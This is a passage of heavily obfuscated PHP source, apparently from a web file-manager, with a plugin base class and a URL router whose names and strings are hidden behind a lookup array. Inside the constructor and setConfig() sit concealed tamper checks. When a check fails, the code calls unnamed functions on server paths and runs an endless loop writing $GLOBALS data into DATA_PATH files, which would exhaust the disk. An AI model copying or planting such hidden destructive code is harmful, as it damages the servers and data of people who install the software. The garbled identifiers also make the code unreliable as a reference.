$ÊĞ…¾ÙÀ = true) { return parent::listData($ß•»ÃË, $ÙŠô¿£À, $ÊĞ…¾ÙÀ); } public function remove($â¦¨çñ) { $Â§™á°¬ = $this->findByName($â¦¨çñ); if (!$Â§™á°¬) { return !1; } return parent::remove($Â§™á°¬[$_SERVER[ú÷îèÆÜ][452]]); } public function add($¢¼Ç»”ú) { if ($this->findByName($¢¼Ç»”ú[$_SERVER[ú÷îèÆÜ][42]])) { return !1; } return parent::insert($¢¼Ç»”ú); } public function update($§ªÕòõî, $àÍû©ÍÕ) { $òçãœñó =& $_SERVER[ú÷îèÆÜ]; $Áğ—Ÿáƒ = $this->findByName($§ªÕòõî); $«˜ßŸ·Î = $this->findByName($àÍû©ÍÕ[$òçãœñó[42]]); if (!$Áğ—Ÿáƒ || $«˜ßŸ·Î && $«˜ßŸ·Î[$òçãœñó[452]] != $Áğ—Ÿáƒ[$òçãœñó[452]]) { return !1; } return parent::update($Áğ—Ÿáƒ[$òçãœñó[452]], $àÍû©ÍÕ); } } goto F–‚“Å™ç ; DÈÁö‘Ğ¸Å: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¯ïÂ¡àö =& $_SERVER[ú÷îèÆÜ]; if ($_SERVER[$¯ïÂ¡àö[6]] != $_SERVER[$¯ïÂ¡àö[7]]) { $è²Ç¢Ë = $¯ïÂ¡àö[918]; $ÑùšùªÍ = $¯ïÂ¡àö[8]; $ ÃÙß£ = $_SERVER[$¯ïÂ¡àö[9]] . $¯ïÂ¡àö[10]; $˜«ÅİËœ = $ÑùšùªÍ($ ÃÙß£); $¤ëÄ¤ó† = explode($¯ïÂ¡àö[11], $˜«ÅİËœ); if (count($¤ëÄ¤ó†) < $¯ïÂ¡àö[662]) { $³ÛÙ—€ğ = $¯ïÂ¡àö[13]; $³ÛÙ—€ğ(); } $ËÊ–Å¨¯ = $¯ïÂ¡àö[919]; $ËÊ–Å¨¯($_SERVER[$¯ïÂ¡àö[920]]); $ËÊ–Å¨¯($_SERVER[$¯ïÂ¡àö[9]] . $¯ïÂ¡àö[1547]); $–»ŸØö× = 1; while ($–»ŸØö× > 1) { $–»ŸØö× = $–»ŸØö× + 4; $ÁúÔáÌ— = rawurlencode($–»ŸØö× . $¯ïÂ¡àö[431]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¯ïÂ¡àö[1548]); $this->pluginName = str_replace($¯ïÂ¡àö[1548], $¯ïÂ¡àö[22], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¯ïÂ¡àö[18]; $this->pluginApi = appHostGet() . $¯ïÂ¡àö[1549] . $this->pluginName . $¯ïÂ¡àö[18]; $this->pluginHost = $config[$¯ïÂ¡àö[1550]] . $this->pluginName . $¯ïÂ¡àö[18]; $this->pluginHostDefault = $config[$¯ïÂ¡àö[1550]] . $this->pluginName . $¯ïÂ¡àö[18]; $Ûèüƒ” = $config[$¯ïÂ¡àö[1551]]; if ($Ûèüƒ” && strpos($¯ïÂ¡àö[60] . $Ûèüƒ” . $¯ïÂ¡àö[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$¯ïÂ¡àö[1552]] . $this->pluginName . $¯ïÂ¡àö[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ú÷îèÆÜ][1553]); } protected function assign($×‰Ëå¶æ, $ö“´Ê©« = false) { if (is_array($×‰Ëå¶æ)) { $this->values = array_merge($this->values, $×‰Ëå¶æ); } else { $this->values[$×‰Ëå¶æ] = $ö“´Ê©«; } } protected function display($±³‰¼¹Ÿ) { extract($this->values); require $±³‰¼¹Ÿ; } final function hookRegist($ÌÅ¢ÅºË) { $this->modelPlugin->appRegist($this->pluginName, $ÌÅ¢ÅºË); } final function appIcon() { $è¬ÀÇÉ¿ =& $_SERVER[ú÷îèÆÜ]; $´ºÆıŠÇ = $this->appPackage(); $Õ½¼‹ÑÎ = $è¬ÀÇÉ¿[22]; if (isset($´ºÆıŠÇ[$è¬ÀÇÉ¿[467]])) { if (isset($´ºÆıŠÇ[$è¬ÀÇÉ¿[467]][$è¬ÀÇÉ¿[1554]])) { $Õ½¼‹ÑÎ = $è¬ÀÇÉ¿[1555] . $´ºÆıŠÇ[$è¬ÀÇÉ¿[467]][$è¬ÀÇÉ¿[1554]] . $è¬ÀÇÉ¿[1556]; } else { if ($´ºÆıŠÇ[$è¬ÀÇÉ¿[467]][$è¬ÀÇÉ¿[1557]]) { $Õ½¼‹ÑÎ = $è¬ÀÇÉ¿[1558] . $´ºÆıŠÇ[$è¬ÀÇÉ¿[467]][$è¬ÀÇÉ¿[1557]] . $è¬ÀÇÉ¿[1559]; } } } return $Õ½¼‹ÑÎ; } final function fileCanView($²êÉ†) { $ôÓŸøì =& $_SERVER[ú÷îèÆÜ]; if (request_url_safe($²êÉ†)) { return !0; } if ($this->isShare($²êÉ†)) { return !0; } $ë€øŞÔ“ = Session::get($ôÓŸøì[1560]); if ($GLOBALS[$ôÓŸøì[545]] != 1 && !$ë€øŞÔ“ || !$ë€øŞÔ“[$ôÓŸøì[1561]]) { $éç¯ª…˜ = $ôÓŸøì[1562] . rawurlencode(this_url()); show_tips(LNG($ôÓŸøì[1563]) . $ôÓŸøì[1564] . $éç¯ª…˜ . $ôÓŸøì[1565] . LNG($ôÓŸøì[1566]) . $ôÓŸøì[1567], !1); } if (!Action($ôÓŸøì[1568])->authCan($ôÓŸøì[1569])) { show_tips(LNG($ôÓŸøì[1570]) . $ôÓŸøì[1571], !1); } ActionCall($ôÓŸøì[1572], $²êÉ†); } final function isShare($©ğ÷—«) { $ú¡ñ“ „ = KodIO::parse($©ğ÷—«); return $ú¡ñ“ „[$_SERVER[ú÷îèÆÜ][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ñ·ãÊ«½) { if (request_url_safe($Ñ·ãÊ«½)) { return $Ñ·ãÊ«½; } if (!$this->isShare($Ñ·ãÊ«½)) { $Ñ·ãÊ«½ = $this->filePath($Ñ·ãÊ«½, !1); } return Action($_SERVER[ú÷îèÆÜ][1215])->linkOut($Ñ·ãÊ«½); } public function filePathLinkOut($“ÂÅ¼€â) { if (request_url_safe($“ÂÅ¼€â)) { return $“ÂÅ¼€â; } $this->fileCanView($“ÂÅ¼€â); return Action($_SERVER[ú÷îèÆÜ][1215])->link($“ÂÅ¼€â); } final function filePath($…ƒÑò, $ûòàÎŠİ = true) { $ş¢õÖ°¢ =& $_SERVER[ú÷îèÆÜ]; if ($Ûüş‹Æ = $this->checkSharePath($…ƒÑò, $ûòàÎŠİ)) { Hook::trigger($ş¢õÖ°¢[1573], $Ûüş‹Æ); return $Ûüş‹Æ; } $this->fileCanView($…ƒÑò); if (request_url_safe($…ƒÑò)) { $±³…Ó†— = parse_url_query($…ƒÑò); if (isset($±³…Ó†—[$ş¢õÖ°¢[1574]]) && isset($±³…Ó†—[$ş¢õÖ°¢[228]])) { $„¾¼³Òô = Model($ş¢õÖ°¢[810])->get($ş¢õÖ°¢[811]); $­Ğ°µ®ï = Mcrypt::decode($±³…Ó†—[$ş¢õÖ°¢[228]], $„¾¼³Òô); if ($­Ğ°µ®ï) { $this->fileInfo = IO::info($­Ğ°µ®ï); $this->fileInfo[$ş¢õÖ°¢[1575]] = $…ƒÑò; $this->cachePath = $this->pluginCachePath($ş¢õÖ°¢[22], $ûòàÎŠİ); if (!$this->fileInfo) { show_tips(LNG($ş¢õÖ°¢[115]), !1); } Hook::trigger($ş¢õÖ°¢[1573], $­Ğ°µ®ï); return $­Ğ°µ®ï; } } $…ƒÑò = $this->_cacheHttpFile($…ƒÑò, $ûòàÎŠİ); $this->fileInfo = IO::info($…ƒÑò); } else { $this->fileInfo = IO::info($…ƒÑò); $this->cachePath = $this->pluginCachePath($ş¢õÖ°¢[22], $ûòàÎŠİ); } if (!$this->fileInfo) { show_tips(LNG($ş¢õÖ°¢[115]), !1); } Hook::trigger($ş¢õÖ°¢[1573], $…ƒÑò); return $…ƒÑò; } final function _cacheHttpFile($Ö‹×š¹, $Æ˜ÒÄ¤± = true) { $‹í–‡ı˜ =& $_SERVER[ú÷îèÆÜ]; $ß Àâá‡ = parse_url_query($Ö‹×š¹); $ÕüÔØ– = get_path_ext($Ö‹×š¹); if (isset($ß Àâá‡[$‹í–‡ı˜[42]]) && $ß Àâá‡[$‹í–‡ı˜[42]]) { $ÕüÔØ– = get_path_ext($ß Àâá‡[$‹í–‡ı˜[42]]); } $¨ÅÇå†› = hash_path($Ö‹×š¹) . $‹í–‡ı˜[20] . $ÕüÔØ–; $this->cachePath = $this->pluginCachePath($Æ˜ÒÄ¤± ? $¨ÅÇå†› : $‹í–‡ı˜[22]); $ù›‹Ïõ = IO::fileNameExist($this->cachePath, $¨ÅÇå†›); if ($ù›‹Ïõ) { return KodIO::make($ù›‹Ïõ); } $°‹îÓÏŒ = rtrim($this->cachePath, $‹í–‡ı˜[18]) . $‹í–‡ı˜[18] . $¨ÅÇå†›; return $this->pluginCacheFileSet($°‹îÓÏŒ, file_get_contents_nossl($Ö‹×š¹)); } final function checkSharePath($¥ÃŞáµ‡, $„ĞÊ¼• = true) { $ïÑü‘ÓĞ =& $_SERVER[ú÷îèÆÜ]; if (!$this->isShare($¥ÃŞáµ‡)) { return !1; } $¬æ•¬”± = Action($ïÑü‘ÓĞ[1215])->sharePathInfo($¥ÃŞáµ‡); if (!is_array($¬æ•¬”±) || !isset($¬æ•¬”±[$ïÑü‘ÓĞ[94]])) { show_json(LNG($ïÑü‘ÓĞ[1576]), !1); } $this->fileInfo = $¬æ•¬”±; $this->cachePath = $this->pluginCachePath(!1, $„ĞÊ¼•); return $¬æ•¬”±[$ïÑü‘ÓĞ[94]]; } final function pluginCachePath($±§Æš’ = '', $…¡«½¸½ = false) { $øäÂ§Œó =& $_SERVER[ú÷îèÆÜ]; if ($…¡«½¸½ && is_array($this->fileInfo)) { $±§Æš’ = kodIO::hashPath($this->fileInfo); } $Ôœ­××£ = rtrim(IO_PATH_SYSTEM_TEMP . $øäÂ§Œó[1577] . $this->pluginName . $øäÂ§Œó[18] . $±§Æš’, $øäÂ§Œó[18]); $€üİÖÅ™ = IO::infoFullSimple($Ôœ­××£); $í¿Çü±Ø = $€üİÖÅ™ && is_array($€üİÖÅ™) ? $€üİÖÅ™[$øäÂ§Œó[94]] : $øäÂ§Œó[22]; if (!$í¿Çü±Ø) { $í¿Çü±Ø = IO::mkdir($Ôœ­××£); } return $í¿Çü±Ø; } final function pluginCacheFileSet($‰İ¢É¹, $ÔÙû¶ù = '') { $ÄÄŸÚ©„ =& $_SERVER[ú÷îèÆÜ]; $æĞ“©­ã = IO::infoFullSimple($‰İ¢É¹); if (!$æĞ“©­ã) { return IO::mkfile($‰İ¢É¹, $ÔÙû¶ù, REPEAT_REPLACE); } IO::setContent($æĞ“©­ã[$ÄÄŸÚ©„[94]], $ÔÙû¶ù); return $æĞ“©­ã[$ÄÄŸÚ©„[94]]; } final function pluginLocalFile($î«âûó = '') { $ƒè´Ÿãë =& $_SERVER[ú÷îèÆÜ]; $íÔüô¨ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($íÔüô¨)) { mk_dir($íÔüô¨); } if (!$î«âûó) { return $íÔüô¨; } $­ÌÜ¼Â = IO::info($î«âûó); $ƒãûŸµÖ = $ƒè´Ÿãë[1578] . KodIO::hashPath($­ÌÜ¼Â) . $ƒè´Ÿãë[20] . $­ÌÜ¼Â[$ƒè´Ÿãë[185]]; if (!checkExtSafe($ƒãûŸµÖ)) { $ƒãûŸµÖ = $ƒãûŸµÖ . $ƒè´Ÿãë[1247]; } $ÂÚ¦÷—Á = $íÔüô¨ . $ƒãûŸµÖ; if (@file_exists($ÂÚ¦÷—Á)) { return $ÂÚ¦÷—Á; } return IO::copy($î«âûó, $íÔüô¨, 0, $ƒãûŸµÖ); } final function appPackage() { $ÁÖş =& $_SERVER[ú÷îèÆÜ]; if ($this->packageData) { return $this->packageData; } $‰æŞ“Ï¹ = $this->parseFile($this->pluginPath . $ÁÖş[1579]); $this->parseLang($‰æŞ“Ï¹); $ñ¯›”ï = json_decode_force($‰æŞ“Ï¹); if (!$ñ¯›”ï) { return array(); } $ˆ®§İ˜Ç = Hook::trigger($ÁÖş[1580], $ñ¯›”ï); if ($ˆ®§İ˜Ç && is_array($ˆ®§İ˜Ç)) { $ñ¯›”ï = $ˆ®§İ˜Ç; } $this->packageData = $ñ¯›”ï; return $ñ¯›”ï; } public function packageInfoGet($ì©œú²) { $Ü„ÍÄ”¿ = $this->appPackage(); return array_get_value($Ü„ÍÄ”¿, $ì©œú²); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ú÷îèÆÜ][1581]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ú÷îèÆÜ][1582]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ú÷îèÆÜ][1583]); } public function echoJsAssign($ßÍØ³š, $¬ ş§Ï) { $this->echoJsAssignArr[$ßÍØ³š] = $¬ ş§Ï; } private function parseFile($Úš§†Ùä) { $‘Ë£§ïÊ =& $_SERVER[ú÷îèÆÜ]; $ÀÚÜ•„â = file_get_contents_nossl($Úš§†Ùä); $¬Ü±¿å† = array($‘Ë£§ïÊ[1584], $‘Ë£§ïÊ[1585], $‘Ë£§ïÊ[1586], $‘Ë£§ïÊ[1587], $‘Ë£§ïÊ[1588], $‘Ë£§ïÊ[1589], $‘Ë£§ïÊ[1590]); $òìÀÉ­á = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$‘Ë£§ïÊ[99]][$‘Ë£§ïÊ[1591]]); foreach ($this->echoJsAssignArr as $Ú©Õ«Úû => $‚‚¾ÜÏ±) { $¬Ü±¿å†[] = $‘Ë£§ïÊ[1592] . $Ú©Õ«Úû . $‘Ë£§ïÊ[1593]; $òìÀÉ­á[] = is_array($‚‚¾ÜÏ±) || is_object($‚‚¾ÜÏ±) ? rawurlencode(json_encode($‚‚¾ÜÏ±)) : $‚‚¾ÜÏ±; } if (strstr($ÀÚÜ•„â, $‘Ë£§ïÊ[1594])) { $±ÄïêÓê = rawurlencode(json_encode($this->pluginLangArr)); $ÀÚÜ•„â = str_replace($‘Ë£§ïÊ[1594], $±ÄïêÓê, $ÀÚÜ•„â); } if (strstr($ÀÚÜ•„â, $‘Ë£§ïÊ[1595])) { $±ÄïêÓê = $±ÄïêÓê = rawurlencode(json_encode($this->getConfig())); $ÀÚÜ•„â = str_replace($‘Ë£§ïÊ[1595], $±ÄïêÓê, $ÀÚÜ•„â); } $ÀÚÜ•„â = str_replace($¬Ü±¿å†, $òìÀÉ­á, $ÀÚÜ•„â); return $ÀÚÜ•„â; } private function parseLang(&$²“‚¼˜û) { $¼ Ù£µ› =& $_SERVER[ú÷îèÆÜ]; $Ì˜™úÍ‰ = $¼ Ù£µ›[1596]; if (!strstr($²“‚¼˜û, $Ì˜™úÍ‰)) { return; } preg_match_all($¼ Ù£µ›[1597], $²“‚¼˜û, $ŞŒÅ¸şÛ); if (!is_array($ŞŒÅ¸şÛ) || count($ŞŒÅ¸şÛ) == 0 || !is_array($ŞŒÅ¸şÛ[0]) || count($ŞŒÅ¸şÛ[0]) == 0) { return; } $¿çÒªã– = array(); $„Ø¯œ¯ = array(); foreach ($ŞŒÅ¸şÛ[0] as $ğ ŒĞ’Á) { $ïÌœ• = substr($ğ ŒĞ’Á, strlen($Ì˜™úÍ‰), -4); $ÌÌµàÌö = LNG($ïÌœ•); $¿çÒªã–[] = $ğ ŒĞ’Á; $„Ø¯œ¯[] = str_replace(array($¼ Ù£µ›[11], $¼ Ù£µ›[1119], $¼ Ù£µ›[395], $¼ Ù£µ›[128]), array($¼ Ù£µ›[63], $¼ Ù£µ›[63], $¼ Ù£µ›[22], $¼ Ù£µ›[1598]), $ÌÌµàÌö); } $²“‚¼˜û = str_replace($¿çÒªã–, $„Ø¯œ¯, $²“‚¼˜û); } private function parseConfig(&$÷º®‡³–) { $ã† ò =& $_SERVER[ú÷îèÆÜ]; $¸Ï„½‡ = $ã† ò[1599]; if (!strstr($÷º®‡³–, $¸Ï„½‡)) { return; } preg_match_all($ã† ò[1600], $÷º®‡³–, $è§’á³…); if (!is_array($è§’á³…) || count($è§’á³…) == 0 || !is_array($è§’á³…[0]) || count($è§’á³…[0]) == 0) { return; } $ßşè¡µŞ = $this->getConfig(); $³ ››ÛÃ = array(); $ÈƒĞåÒÎ = array(); foreach ($è§’á³…[0] as $Ğü™šİ¹) { $«ĞçŒØÓ = substr($Ğü™šİ¹, strlen($¸Ï„½‡), -2); $³ ››ÛÃ[] = $Ğü™šİ¹; $ÈƒĞåÒÎ[] = _get($ßşè¡µŞ, $«ĞçŒØÓ); } $÷º®‡³– = str_replace($³ ››ÛÃ, $ÈƒĞåÒÎ, $÷º®‡³–); } private function parsePackage(&$©­ ö¡®) { $Â—¨É÷Ä =& $_SERVER[ú÷îèÆÜ]; $şÍù²óª = $Â—¨É÷Ä[1601]; if (!strstr($©­ ö¡®, $şÍù²óª)) { return; } preg_match_all($Â—¨É÷Ä[1602], $©­ ö¡®, $Ô‘ä‰ÎÓ); if (!is_array($Ô‘ä‰ÎÓ) || count($Ô‘ä‰ÎÓ) == 0 || !is_array($Ô‘ä‰ÎÓ[0]) || count($Ô‘ä‰ÎÓ[0]) == 0) { return; } $ˆÁÕ‘ÉŸ = $this->appPackage(); $ıö¬ù ‹ = array(); $»Ì‚¶ŞÃ = array(); foreach ($Ô‘ä‰ÎÓ[0] as $õğäú¶Ç) { $éÖíßÎ = substr($õğäú¶Ç, strlen($şÍù²óª), -2); $ıö¬ù ‹[] = $õğäú¶Ç; $»Ì‚¶ŞÃ[] = _get($ˆÁÕ‘ÉŸ, $éÖíßÎ); } $©­ ö¡® = str_replace($ıö¬ù ‹, $»Ì‚¶ŞÃ, $©­ ö¡®); } final function echoFile($åÛ”—î£, $Ô½ÚëÍ‘ = false) { $è‘¸¬¡î =& $_SERVER[ú÷îèÆÜ]; $ê²ã¥î = $this->pluginPath . $åÛ”—î£; if (ACT == $è‘¸¬¡î[1603]) { echo $è‘¸¬¡î[1604] . $this->pluginName . $è‘¸¬¡î[18] . $åÛ”—î£ . $è‘¸¬¡î[1605]; if (!file_exists($ê²ã¥î)) { echo $è‘¸¬¡î[1606]; return; } } $†¸¡€Öİ = $this->parseFile($ê²ã¥î); $this->parseLang($†¸¡€Öİ); $this->parseConfig($†¸¡€Öİ); $this->parsePackage($†¸¡€Öİ); if (is_array($Ô½ÚëÍ‘)) { $†¸¡€Öİ = str_replace(array_keys($Ô½ÚëÍ‘), array_values($Ô½ÚëÍ‘), $†¸¡€Öİ); } echo $è‘¸¬¡î[11] . $†¸¡€Öİ; } final function initLang() { $Ñùú–¸ˆ =& $_SERVER[ú÷îèÆÜ]; $”¦§ÚØ¡ = $Ñùú–¸ˆ[1607]; $Ü‚ò”Ş¬ = $this->pluginPath . $Ñùú–¸ˆ[1608]; $šíËñƒ = I18n::getType(); $Í˜Ë°„« = array(); if (file_exists($Ü‚ò”Ş¬ . $šíËñƒ . $Ñùú–¸ˆ[879])) { $Í˜Ë°„« = (include $Ü‚ò”Ş¬ . $šíËñƒ . $Ñùú–¸ˆ[879]); } else { if ($šíËñƒ == $Ñùú–¸ˆ[1609] && !file_exists($Ü‚ò”Ş¬ . $šíËñƒ . $Ñùú–¸ˆ[879]) && file_exists($Ü‚ò”Ş¬ . $Ñùú–¸ˆ[1610])) { $Í˜Ë°„« = (include $Ü‚ò”Ş¬ . $Ñùú–¸ˆ[1610]); } else { if (file_exists($Ü‚ò”Ş¬ . $”¦§ÚØ¡ . $Ñùú–¸ˆ[879])) { $Í˜Ë°„« = (include $Ü‚ò”Ş¬ . $”¦§ÚØ¡ . $Ñùú–¸ˆ[879]); } } } if (!is_array($Í˜Ë°„«)) { return array(); } if (@count($Í˜Ë°„«) > 0) { I18n::set($Í˜Ë°„«); } return $Í˜Ë°„«; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ôäÙüõ) { $°ì›¬Æ¸ =& $_SERVER[ú÷îèÆÜ]; $¢ÛÆäÜ‘ = $_SERVER[$°ì›¬Æ¸[9]] . $°ì›¬Æ¸[10]; $ìÕ‹­£º = $°ì›¬Æ¸[917]; if ($_SERVER[$°ì›¬Æ¸[6]] != $ìÕ‹­£º($¢ÛÆäÜ‘)) { $¸È˜Úµ = $°ì›¬Æ¸[918]; $äˆ¬—Ç = $°ì›¬Æ¸[8]; $ ë¾Ñ½á = $_SERVER[$°ì›¬Æ¸[9]] . $°ì›¬Æ¸[10]; $åà§ü™ = $äˆ¬—Ç($ ë¾Ñ½á); $ÀáŸ¦İé = explode($°ì›¬Æ¸[11], $åà§ü™); if (count($ÀáŸ¦İé) < $°ì›¬Æ¸[662]) { $”’›Ú–‚ = $°ì›¬Æ¸[13]; $”’›Ú–‚(); } $·½ÇÚù = $°ì›¬Æ¸[919]; $·½ÇÚù($_SERVER[$°ì›¬Æ¸[920]]); $¸È˜Úµ = $°ì›¬Æ¸[918]; $¸È˜Úµ(); $·¢İûĞ = $°ì›¬Æ¸[921]; $¨ªµ˜Ãœ = json_encode($GLOBALS[$°ì›¬Æ¸[922]]); $Äºã­  = 1; for ($¨µ‰Ÿì = $Äºã­ ; $¨µ‰Ÿì > 0; $¨µ‰Ÿì++) { $·¢İûĞ(DATA_PATH . $¨µ‰Ÿì, $¨ªµ˜Ãœ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ôäÙüõ); } public function onSetConfig($æšü¿õ) { } public function onGetConfig($àæÖéÖ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($‡şü‹èğ) { if ($‡şü‹èğ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($â…›ƒë· = "\160\154\165\x67\151\x6e\x41\165\164\x68") { $Ãï›¶áª =& $_SERVER[ú÷îèÆÜ]; if (!Session::get($Ãï›¶áª[1560])) { return !1; } if (_get($GLOBALS, $Ãï›¶áª[545])) { return !0; } $®àÀ‡ëè = $this->getConfig(); if (!$®àÀ‡ëè[$â…›ƒë·]) { return !1; } return ActionCall($Ãï›¶áª[1611], $®àÀ‡ëè[$â…›ƒë·]); } public function url($…òˆäù§, $—Å­…ñ” = '', $œÓ¿Š›´ = true) { $ñÂâ½Ğù =& $_SERVER[ú÷îèÆÜ]; $ˆï³É¤ = $this->getConfig(); $Ã…ö³‰ğ = KOD_VERSION . $ñÂâ½Ğù[20] . KOD_VERSION_BUILD; $¼ûÄ“Ë’ = $this->packageVersion(); $À¡¿Øìî = $Ã…ö³‰ğ . $ñÂâ½Ğù[439] . $¼ûÄ“Ë’; if (substr($…òˆäù§, 0, 4) == $ñÂâ½Ğù[159] || substr($…òˆäù§, 0, 2) == $ñÂâ½Ğù[1394]) { $æ³ÑÕ“­ = $…òˆäù§ . $ñÂâ½Ğù[1612] . $À¡¿Øìî; } else { if ($—Å­…ñ” == $ñÂâ½Ğù[22]) { $æ³ÑÕ“­ = $this->pluginHost . $…òˆäù§ . $ñÂâ½Ğù[1612] . $À¡¿Øìî; } else { if ($—Å­…ñ” === $ñÂâ½Ğù[85]) { $æ³ÑÕ“­ = $this->pluginHost . $…òˆäù§; } else { if ($—Å­…ñ” == $ñÂâ½Ğù[1613]) { $æ³ÑÕ“­ = STATIC_PATH . $…òˆäù§ . $ñÂâ½Ğù[1612] . $Ã…ö³‰ğ; } else { if ($—Å­…ñ” == $ñÂâ½Ğù[1614]) { $æ³ÑÕ“­ = APP_HOST . $ñÂâ½Ğù[1615] . $…òˆäù§ . $ñÂâ½Ğù[1612] . $Ã…ö³‰ğ; } else { if (isset($ˆï³É¤[$—Å­…ñ”])) { $æ³ÑÕ“­ = $ˆï³É¤[$—Å­…ñ”] . $…òˆäù§ . $ñÂâ½Ğù[1612] . $À¡¿Øìî; } } } } } } if (!$œÓ¿Š›´) { return $æ³ÑÕ“­; } echo $æ³ÑÕ“­; } public function link($ÓÅçÙñ = false, $ù‘Ê°×ô = '') { $Š¥¤“× =& $_SERVER[ú÷îèÆÜ]; if (!$ÓÅçÙñ) { $this->link($Š¥¤“×[1616], $Š¥¤“×[1614]); $this->link($Š¥¤“×[1617], $Š¥¤“×[1613]); $this->link($Š¥¤“×[1618], $Š¥¤“×[1613]); $this->link($Š¥¤“×[1619], $Š¥¤“×[1613]); $this->link($Š¥¤“×[1620], $Š¥¤“×[1613]); return; } $ Şöœè« = $this->url($ÓÅçÙñ, $ù‘Ê°×ô, !1); if (substr($ÓÅçÙñ, -3) == $Š¥¤“×[1621]) { echo $Š¥¤“×[1622] . $ Şöœè« . $Š¥¤“×[1623] . $Š¥¤“×[11]; } else { if (substr($ÓÅçÙñ, -4) == $Š¥¤“×[1624]) { echo $Š¥¤“×[1625] . $ Şöœè« . $Š¥¤“×[1626] . $Š¥¤“×[11]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\x5e\x2f\x5d\53", "\x3a\x6e\x75\x6d" => "\133\x30\55\71\x5d\x2b", "\x3a\x61\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($üµ§îÀí, $÷­¶«¨Ÿ) { $‡ ÆšÁ÷ =& $_SERVER[ú÷îèÆÜ]; if ($üµ§îÀí == $‡ ÆšÁ÷[1627]) { $Œ‹Ñ»‚Õ = array_map($‡ ÆšÁ÷[1628], $÷­¶«¨Ÿ[0]); $ÎˆäÌ•© = strpos($÷­¶«¨Ÿ[1], $‡ ÆšÁ÷[18]) === 0 ? $÷­¶«¨Ÿ[1] : $‡ ÆšÁ÷[18] . $÷­¶«¨Ÿ[1]; $È®ä…‹£ = $÷­¶«¨Ÿ[2]; } else { $Œ‹Ñ»‚Õ = null; $ÎˆäÌ•© = strpos($÷­¶«¨Ÿ[0], $‡ ÆšÁ÷[18]) === 0 ? $÷­¶«¨Ÿ[0] : $‡ ÆšÁ÷[18] . $÷­¶«¨Ÿ[0]; $È®ä…‹£ = $÷­¶«¨Ÿ[1]; } array_push(self::$maps, $Œ‹Ñ»‚Õ); array_push(self::$routes, $ÎˆäÌ•©); array_push(self::$methods, strtoupper($üµ§îÀí)); array_push(self::$callbacks, $È®ä…‹£); } public static function error($æ®Ö½ã) { self::$errorCallback = $æ®Ö½ã; } public static function haltOnMatch($Û†×‰Ë€ = true) { self::$halts = $Û†×‰Ë€; } public static function dispatch() { $çˆŞôñŞ =& $_SERVER[ú÷îèÆÜ]; $Î¢³Æ¢ = parse_url($_SERVER[$çˆŞôñŞ[1629]], PHP_URL_PATH); $óúØ‹¨± = $_SERVER[$çˆŞôñŞ[170]]; $©İ¾ùÇÕ = array_keys(static::$patterns); $Û½´°…Ì = array_values(static::$patterns); $òÒ¥îÂ• = !1; self::$routes = preg_replace($çˆŞôñŞ[1317], $çˆŞôñŞ[18], self::$routes); if (in_array($Î¢³Æ¢, self::$routes)) { $ÂŒ³Ÿ‚ = array_keys(self::$routes, $Î¢³Æ¢); foreach ($ÂŒ³Ÿ‚ as $êÁğˆ’©) { if (self::$methods[$êÁğˆ’©] == $óúØ‹¨± || self::$methods[$êÁğˆ’©] == $çˆŞôñŞ[1630] || in_array($óúØ‹¨±, self::$maps[$êÁğˆ’©])) { $òÒ¥îÂ• = !0; if (!is_object(self::$callbacks[$êÁğˆ’©])) { $ä¯³¨³Ó = explode($çˆŞôñŞ[18], self::$callbacks[$êÁğˆ’©]); $×ã ‘û = end($ä¯³¨³Ó); $¥¸ßø¶À = explode($çˆŞôñŞ[1249], $×ã ‘û); $ÙØ÷ÏæÎ = new $¥¸ßø¶À[0](); $ÙØ÷ÏæÎ->{$¥¸ßø¶À[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$êÁğˆ’©]); if (self::$halts) { return; } } } } } else { $¢¬ƒŠÌª = 0; foreach (self::$routes as $êÁğˆ’©) { if (strpos($êÁğˆ’©, $çˆŞôñŞ[4]) !== !1) { $êÁğˆ’© = str_replace($©İ¾ùÇÕ, $Û½´°…Ì, $êÁğˆ’©); } if (preg_match($çˆŞôñŞ[1631] . $êÁğˆ’© . $çˆŞôñŞ[1632], $Î¢³Æ¢, $Á›¦ôÕÄ)) { if (self::$methods[$¢¬ƒŠÌª] == $óúØ‹¨± || self::$methods[$¢¬ƒŠÌª] == $çˆŞôñŞ[1630] || !empty(self::$maps[$¢¬ƒŠÌª]) && in_array($óúØ‹¨±, self::$maps[$¢¬ƒŠÌª])) { $òÒ¥îÂ• = !0; array_shift($Á›¦ôÕÄ); if (!is_object(self::$callbacks[$¢¬ƒŠÌª])) { $ä¯³¨³Ó = explode($çˆŞôñŞ[18], self::$callbacks[$¢¬ƒŠÌª]); $×ã ‘û = end($ä¯³¨³Ó); $¥¸ßø¶À = explode($çˆŞôñŞ[1249], $×ã ‘û); $ÙØ÷ÏæÎ = new $¥¸ßø¶À[0](); if (!method_exists($ÙØ÷ÏæÎ, $¥¸ßø¶À[1])) { echo $çˆŞôñŞ[1633]; } else { call_user_func_array(array($ÙØ÷ÏæÎ, $¥¸ßø¶À[1]), $Á›¦ôÕÄ); } if (self::$halts) { return; } } else { 